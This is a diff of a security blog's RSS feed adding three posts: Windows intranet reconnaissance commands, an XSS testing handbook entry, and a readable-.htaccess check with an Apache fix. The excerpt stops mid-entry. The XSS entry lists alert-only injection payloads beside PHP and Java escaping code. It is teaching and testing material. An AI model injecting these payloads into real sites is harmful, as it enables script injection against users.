@@ -6,9 +6,316 @@
 </description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Fri, 27 Apr 2018 19:28:06 +0800</pubDate>
-    <lastBuildDate>Fri, 27 Apr 2018 19:28:06 +0800</lastBuildDate>
+    <pubDate>Wed, 02 May 2018 00:42:46 +0800</pubDate>
+    <lastBuildDate>Wed, 02 May 2018 00:42:46 +0800</lastBuildDate>
     <generator>Jekyll v3.6.2</generator>
+    
+      <item>
+        <title>Windows内网渗透基础命令</title>
+        <description>&lt;p&gt;整理的一些内网渗透基础命令
+&lt;!--more--&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;0x00-前言&quot;&gt;0x00 前言&lt;/h2&gt;
+
+&lt;p&gt;所有环境均为本地搭建测试。&lt;/p&gt;
+
+&lt;h2 id=&quot;0x01-网络命令&quot;&gt;0x01 网络命令&lt;/h2&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;命令&lt;/th&gt;
+      &lt;th&gt;语义&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;ipconfig /all&lt;/td&gt;
+      &lt;td&gt;获取网络配置信息&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\administrator&amp;gt;ipconfig /all
+Windows IP 配置
+
+   主机名  . . . . . . . . . . . . . : LIYINGZHEA30B
+   主 DNS 后缀 . . . . . . . . . . . : payloads.online
+   节点类型  . . . . . . . . . . . . : 混合
+   IP 路由已启用 . . . . . . . . . . : 否
+   WINS 代理已启用 . . . . . . . . . : 否
+   DNS 后缀搜索列表  . . . . . . . . : payloads.online
+                                       localdomain
+
+以太网适配器 本地连接:
+   连接特定的 DNS 后缀 . . . . . . . : localdomain
+   描述. . . . . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
+   物理地址. . . . . . . . . . . . . : 00-1C-42-FE-2D-C3
+   DHCP 已启用 . . . . . . . . . . . : 是
+   自动配置已启用. . . . . . . . . . : 是
+   IPv6 地址 . . . . . . . . . . . . : fdb2:2c26:f4e4:0:9df6:d0e9:1af1:89d9(首选)
+   临时 IPv6 地址. . . . . . . . . . : fdb2:2c26:f4e4:0:1899:1d95:681e:22d8(首选)
+   本地链接 IPv6 地址. . . . . . . . : fe80::9df6:d0e9:1af1:89d9%11(首选)
+   IPv4 地址 . . . . . . . . . . . . : 10.211.55.11(首选)
+   子网掩码  . . . . . . . . . . . . : 255.255.255.0
+   获得租约的时间  . . . . . . . . . : 2018年5月1日 下午10:13:33
+   租约过期的时间  . . . . . . . . . : 2018年5月1日 下午10:47:07
+   默认网关. . . . . . . . . . . . . : fe80::21c:42ff:fe00:18%11
+                                       10.211.55.1
+   DHCP 服务器 . . . . . . . . . . . : 10.211.55.1
+   DHCPv6 IAID . . . . . . . . . . . : 234888258
+   DHCPv6 客户端 DUID  . . . . . . . : 00-01-00-01-21-D7-A6-F6-00-1C-42-FE-2D-C3
+
+   DNS 服务器  . . . . . . . . . . . : fe80::21c:42ff:fe00:18%11
+                                       192.168.3.18
+   TCPIP 上的 NetBIOS  . . . . . . . : 已启用
+
+隧道适配器 Teredo Tunneling Pseudo-Interface:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开
+   连接特定的 DNS 后缀 . . . . . . . :
+   描述. . . . . . . . . . . . . . . : Teredo Tunneling Pseudo-Interface
+   物理地址. . . . . . . . . . . . . : 00-00-00-00-00-00-00-E0
+   DHCP 已启用 . . . . . . . . . . . : 否
+   自动配置已启用. . . . . . . . . . : 是
+
+C:\Users\administrator&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;通过以上信息我们可以获取域名、IP地址、DHCP服务器、网关、MAC地址、主机名&lt;/p&gt;
+
+</description>
+        <pubDate>Tue, 01 May 2018 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/archivers/2018-05-01/1</link>
+        <guid isPermaLink="true">http://localhost:4000/archivers/2018-05-01/1</guid>
+        
+        
+        <category>内网渗透</category>
+        
+      </item>
+    
+      <item>
+        <title>XSS跨站脚本漏洞</title>
+        <description>&lt;p&gt;《Web安全测试学习手册》- XSS跨站脚本漏洞
+&lt;!--more--&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;0x00-xss跨站脚本漏洞&quot;&gt;0x00 XSS跨站脚本漏洞&lt;/h2&gt;
+
+&lt;h3 id=&quot;1什么是xss跨站脚本漏洞&quot;&gt;1）什么是XSS跨站脚本漏洞&lt;/h3&gt;
+
+&lt;p&gt;跨站脚本（cross site script）为了避免与样式css混淆，所以简称为XSS。&lt;/p&gt;
+
+&lt;p&gt;XSS是一种经常出现在web应用中的计算机安全漏洞，也是web中最主流的攻击方式。那么什么是XSS呢？&lt;/p&gt;
+
+&lt;p&gt;XSS是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到web页面中去。使别的用户访问都会执行相应的嵌入代码。&lt;/p&gt;
+
+&lt;p&gt;从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。&lt;/p&gt;
+
+&lt;h3 id=&quot;2xss跨站脚本漏洞的特点&quot;&gt;2）XSS跨站脚本漏洞的特点&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;所有攻击操作均在浏览器上实现&lt;/li&gt;
+  &lt;li&gt;大多使用Javascript代码&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;0x01-xss跨站脚本漏洞---风险等级&quot;&gt;0x01 XSS跨站脚本漏洞 - 风险等级&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;高&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;0x02-xss跨站脚本漏洞---原理&quot;&gt;0x02 XSS跨站脚本漏洞 - 原理&lt;/h2&gt;
+
+&lt;p&gt;是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到web页面中去。使别的用户访问都会执行相应的嵌入代码。&lt;/p&gt;
+
+&lt;h2 id=&quot;0x03-xss跨站脚本漏洞---常见场景&quot;&gt;0x03 XSS跨站脚本漏洞 - 常见场景&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;留言板&lt;/li&gt;
+  &lt;li&gt;SNS社区&lt;/li&gt;
+  &lt;li&gt;文章发布&lt;/li&gt;
+  &lt;li&gt;论坛&lt;/li&gt;
+  &lt;li&gt;….&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;0x04-测试方案&quot;&gt;0x04 测试方案&lt;/h2&gt;
+
+&lt;p&gt;在输入点提交如下payload，查看响应内容、结果，判断&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;gt;、&quot;、'、&amp;lt;、/、*&lt;/code&gt;等字符是否过滤&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;gt;&quot;'&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;'';!--&quot;&amp;lt;XSS&amp;gt;=&amp;amp;{()}&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;'';!--&quot;&amp;lt;script&amp;gt;alert(0);&amp;lt;/script&amp;gt;=&amp;amp;{()}&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;'';!--&quot;&amp;lt;script&amp;gt;alert(0);&amp;lt;/script&amp;gt;=&amp;amp;{(alert(1))}&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;gt;&amp;lt;script&amp;gt;alert(0)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;');alert(0);//&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/&amp;gt;&amp;lt;SCRIPT&amp;gt;/*s*/alert(String.from+CharCode(88, 83, 83))&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;//&quot;&amp;gt;&amp;lt;scriPT&amp;gt;console.log(0);&amp;lt;/sCRIpt&amp;gt;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script/onreadystatechange=alert(1)&amp;gt;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;img src=&quot;--&amp;gt;&amp;lt;img src=x onerror=alert(1)//&quot;&amp;gt;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;svg/onload=alert(1)&amp;gt;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&amp;gt;&amp;lt;/object&amp;gt;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;....&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;若代码能够执行，则存在XSS跨站脚本漏洞&lt;/p&gt;
+
+&lt;h2 id=&quot;0x05-修复方案&quot;&gt;0x05 修复方案&lt;/h2&gt;
+
+&lt;h3 id=&quot;php&quot;&gt;PHP&lt;/h3&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;strip_tags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;允许标签&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;#从字符串中去除 HTML 和 PHP 标记
+&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;htmlentities&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;           	&lt;span class=&quot;c1&quot;&gt;#转义html实体
+&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;html_entity_decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;     	&lt;span class=&quot;c1&quot;&gt;#反转义html实体
+&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;addcslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'字符'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;     	&lt;span class=&quot;c1&quot;&gt;#给某些字符加上反斜杠
+&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;stripcslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;          	&lt;span class=&quot;c1&quot;&gt;#去掉反斜杠
+&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;addslashes&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;              &lt;span class=&quot;c1&quot;&gt;#单引号、双引号、反斜线与 NULL加反斜杠
+&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;stripslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;              &lt;span class=&quot;c1&quot;&gt;#去掉反斜杠
+&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;htmlspecialchars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;              &lt;span class=&quot;c1&quot;&gt;#特殊字符转换为HTML实体
+&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;htmlspecialchars_decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;#将特殊的 HTML 实体转换回普通字符
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;java&quot;&gt;Java&lt;/h3&gt;
+
+&lt;p&gt;方法一：特殊字符替换&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;        
+     &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;'&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;apos;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;replaceAll&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;amp;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;//&quot;&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\t&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;nbsp;&amp;amp;nbsp;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;// 替换跳格&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;nbsp;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;// 替换空格&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;lt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;replaceAll&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+ &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;方法二：&lt;/p&gt;
+
+&lt;p&gt;apache工具包common-lang中有一个很有用的处理字符串的工具类，其中之一就是StringEscapeUtils,这个工具类是在2.3版本以上加上的去的，利用它能很方便的进行html,xml,java等的转义与反转义&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;org.apache.commons.lang3&lt;/code&gt;包有个&lt;code class=&quot;highlighter-rouge&quot;&gt;StringEscapeUtils&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;StringEscapeUtils&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;unescapeHtml4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;方法三：&lt;/p&gt;
+
+&lt;p&gt;org.springframework.web.util.HtmlUtils 可以实现HTML标签及转义字符之间的转换。&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/** HTML转义 **/&lt;/span&gt;  
+&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HtmlUtils&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;htmlEscape&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;div&amp;gt;hello world&amp;lt;/div&amp;gt;&amp;lt;p&amp;gt;&amp;amp;nbsp;&amp;lt;/p&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  
+&lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  
+&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HtmlUtils&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;htmlUnescape&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  
+&lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;执行结果&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;amp;lt;div&amp;amp;gt;hello world&amp;amp;lt;/div&amp;amp;gt;&amp;amp;lt;p&amp;amp;gt;&amp;amp;amp;nbsp;&amp;amp;lt;/p&amp;amp;gt;  
+  
+&amp;lt;div&amp;gt;hello world&amp;lt;/div&amp;gt;&amp;lt;p&amp;gt;&amp;amp;nbsp;&amp;lt;/p&amp;gt;  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Sat, 28 Apr 2018 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/archivers/2018-04-28/2</link>
+        <guid isPermaLink="true">http://localhost:4000/archivers/2018-04-28/2</guid>
+        
+        
+        <category>Web安全测试学习手册</category>
+        
+      </item>
+    
+      <item>
+        <title>分布式部署文件可读</title>
+        <description>&lt;p&gt;《Web安全测试学习手册》- 分布式部署文件可读
+&lt;!--more--&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;0x00-分布式部署文件可读&quot;&gt;0x00 分布式部署文件可读&lt;/h2&gt;
+
+&lt;h3 id=&quot;1什么是分布式部署文件可读&quot;&gt;1）什么是分布式部署文件可读&lt;/h3&gt;
+
+&lt;p&gt;Apache中的&lt;code class=&quot;highlighter-rouge&quot;&gt;.htaccess&lt;/code&gt;或者”分布式配置”了针对目录改变配置的方法，即，在特定的文档目录中放置包含或多个指令的，以作用于此目录及其子目录。&lt;/p&gt;
+
+&lt;p&gt;这个文件默认情况下客户端是不可读的，假设客户端能够读取此文件，攻击者利用这一特性可以获取分布式配置的指令，泄漏服务器端敏感信息。&lt;/p&gt;
+
+&lt;h3 id=&quot;2分布式部署文件可读的特点&quot;&gt;2）分布式部署文件可读的特点&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;.ht开头文件可读&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;0x01-分布式部署文件可读---风险等级&quot;&gt;0x01 分布式部署文件可读 - 风险等级&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;高&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;0x02-分布式部署文件可读---原理&quot;&gt;0x02 分布式部署文件可读 - 原理&lt;/h2&gt;
+
+&lt;p&gt;客户端请求类似于如下URL：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;http://payloads.online/.htaccess&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Web中间件将读取&lt;code class=&quot;highlighter-rouge&quot;&gt;.htaccess&lt;/code&gt;文件内容响应给客户端，客户端能够获取分布式配置指令。&lt;/p&gt;
+
+&lt;h2 id=&quot;0x03-分布式部署文件可读---常见场景&quot;&gt;0x03 分布式部署文件可读 - 常见场景&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Apache Web 服务器&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;0x04-测试方案&quot;&gt;0x04 测试方案&lt;/h2&gt;
+
+&lt;p&gt;使用CURL访问分布式配置文件&lt;/p&gt;
+
+&lt;p&gt;命令：&lt;code class=&quot;highlighter-rouge&quot;&gt;curl -I http://payloads.online/.htaccess&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  ~ curl -I http://10.211.55.12/.htaccess
+HTTP/1.1 200 OK
+Date: Sat, 28 Apr 2018 02:31:02 GMT
+Last-Modified: Sat, 28 Apr 2018 02:30:16 GMT
+ETag: &quot;17-56adf66b3a848&quot;
+Accept-Ranges: bytes
+Content-Length: 23
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;若响应状态码为&lt;code class=&quot;highlighter-rouge&quot;&gt;200&lt;/code&gt;则存在此风险&lt;/p&gt;
+
+&lt;h2 id=&quot;0x05-修复方案&quot;&gt;0x05 修复方案&lt;/h2&gt;
+
+&lt;p&gt;在Apache的配置文件httpd.conf中添加：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;Files &quot;.ht*&quot;&amp;gt;
+    Require all denied
+&amp;lt;/Files&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;修复后：&lt;/p&gt;
+
